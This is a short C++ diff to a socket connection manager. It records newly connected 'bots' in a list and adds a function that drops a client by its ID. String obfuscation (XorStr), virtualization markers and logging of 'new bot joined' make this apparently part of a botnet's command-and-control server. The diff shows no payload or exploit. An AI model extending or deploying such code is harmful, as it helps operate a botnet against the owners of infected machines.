@@ -67,7 +67,8 @@ void net::c_consock::connector()
 				matched = true;
 			}
 			if (!matched) break;
-		}		
+		}
+		net::c_consock::Instance().connections.push_back(construct);
 		dbglog(XorStr("[ new bot joined, identity: %ull ]\n"), construct->identity);
 		boot::c_thread::Instance().add(new boot::thread_strc::s_thread_i(([this](void* data)
 		{
@@ -77,4 +78,23 @@ void net::c_consock::connector()
 		}), 15, construct->identity, client_socket));
 	}
 	vmend;
+}
+bool net::c_consock::destroy(ULONGLONG uid)
+{
+	uvirt;
+
+	for (size_t i = 0; i < this->connections.size(); i++)
+	{
+		auto obj = this->connections[i];
+		if (!obj || obj->identity != uid) continue;
+		this->connections.erase(this->connections.begin() + i);
+		delete obj;
+		dbglog(XorStr("[ dropped connection of client %ull ]\n"), uid);
+		break;
+	}
+
+	boot::c_thread::Instance().destroy(uid);
+	
+	vmend;	
+	return true;
 }
